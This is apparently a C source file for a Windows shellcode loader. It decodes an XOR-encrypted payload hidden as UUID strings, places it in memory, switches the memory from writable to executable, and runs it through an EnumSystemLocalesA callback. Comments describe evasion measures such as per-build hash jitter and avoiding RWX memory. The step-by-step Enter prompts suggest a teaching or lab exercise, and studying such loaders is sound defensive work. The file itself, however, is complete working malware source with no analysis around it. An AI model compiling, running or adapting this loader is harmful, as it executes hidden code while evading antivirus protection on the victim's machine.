#include <Windows.h>
#include <stdio.h>

#define BUILD_SEED 0xDEAD0003
#define XOR_KEY 0xAA

#define NumberOfElements 17
char* UuidArray[] = {
    "4E29E256-425A-AA6A-AAAA-EBFBEBFAF8FB",
    "789BE2FC-E2CF-F821-CAE2-21F8B2E221F8",
    "D821E28A-E2FA-1DA5-E0E0-E79B63E29B6A",
    "D6CB9606-86A8-EB8A-6B63-A7EBAB6B4847",
    "E2FBEBF8-F821-218A-E896-E2AB7A212A22",
    "E2AAAAAA-6A2F-CDDE-E2AB-7AFA21E2B2EE",
    "E38AEA21-7AAB-FC49-E255-63EB219E22E2",
    "9BE77CAB-E263-6A9B-06EB-6B63A7EBAB6B",
    "5BDF4A92-A9E6-8EE6-A2EF-937BDF72F2EE",
    "E38EEA21-7AAB-EBCC-21A6-E2EE21EAB6E3",
    "21EB7AAB-22AE-ABE2-7AEB-F2EBF2F4F3F0",
    "F3EBF2EB-F0EB-29E2-468A-EBF8554AF2EB",
    "21E2F0F3-43B8-55FD-5555-F7E210ABAAAA",
    "AAAAAAAA-E2AA-2727-ABAB-AAAAEB109B21",
    "7F552DC5-4A11-80B7-A0EB-100C3F173755",
    "6E29E27F-9682-D6AC-A02A-514ADFAF11ED",
    "C0C5D8B9-F3AA-23EB-7055-7FC9CBC6C9AA"
};

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR    StringUuid,
    UUID*       Uuid
);

void WaitForEnter() {
    int c;
    while ((c = getchar()) != '\n' && c != EOF);
}

BOOL UuidDeobfuscation(
    IN  CHAR*   UuidArray[],
    IN  SIZE_T  NmbrOfElements,
    OUT PBYTE*  ppDAddress,
    OUT SIZE_T* pDSize)
{
    PBYTE       pBuffer     = NULL;
    PBYTE       TmpBuffer   = NULL;
    SIZE_T      sBuffSize   = NULL;
    NTSTATUS    STATUS      = NULL;

    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(
        LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed: %d\n", GetLastError());
        return FALSE;
    }

    sBuffSize = NmbrOfElements * 16;
    pBuffer   = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed: %d\n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;
    for (int i = 0; i < NmbrOfElements; i++) {
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            printf("[!] UuidFromStringA Failed At [%s] Error 0x%0.8X\n", UuidArray[i], STATUS);
            return FALSE;
        }
        TmpBuffer += 16;
    }

    *ppDAddress = pBuffer;
    *pDSize     = sBuffSize;
    return TRUE;
}

void XorDecrypt(PBYTE pBuffer, SIZE_T sSize, BYTE bKey) {
    for (SIZE_T i = 0; i < sSize; i++) {
        pBuffer[i] ^= bKey;
    }
}

int main() {
    // Build jitter — different binary hash each compile
    volatile DWORD _seed = BUILD_SEED;
    (void)_seed;

    PBYTE   pDeobfuscatedPayload    = NULL;
    SIZE_T  sDeobfuscatedSize       = NULL;
    DWORD   dwOldProtection         = NULL;

    printf("[i] PID: %d\n", GetCurrentProcessId());
    printf("[#] Press <Enter> To Decrypt ...");
    WaitForEnter();

    // Step 1 — UUID decode - still XOR encrypted
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize))
        return -1;

    printf("[+] UUID Decoded @ 0x%p  Size: %lu\n", pDeobfuscatedPayload, (unsigned long)sDeobfuscatedSize);

    // Step 2 — XOR decrypt - raw shellcode
    XorDecrypt(pDeobfuscatedPayload, sDeobfuscatedSize, XOR_KEY);
    printf("[+] XOR Decrypted\n");

    printf("[#] Press <Enter> To Allocate ...");
    WaitForEnter();

    // Step 3 — Allocate RW only, no execute
    PVOID pShellcodeAddress = VirtualAlloc(
        NULL, sDeobfuscatedSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed: %d\n", GetLastError());
        return -1;
    }
    printf("[i] Allocated @ 0x%p\n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write ...");
    WaitForEnter();

    // Step 4 — Copy to executable region - wipe heap copy immediately
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);
    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    pDeobfuscatedPayload = NULL;

    // Step 5 — Flip RW → RX (never RWX)
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize,
        PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Memory: RW -> RX\n");

    printf("[#] Press <Enter> To Run ...");
    WaitForEnter();

    // Step 6 — Execute via callback
    EnumSystemLocalesA((LOCALE_ENUMPROCA)pShellcodeAddress, 0);

    printf("[#] Press <Enter> To Quit ...");
    WaitForEnter();
    return 0;
}
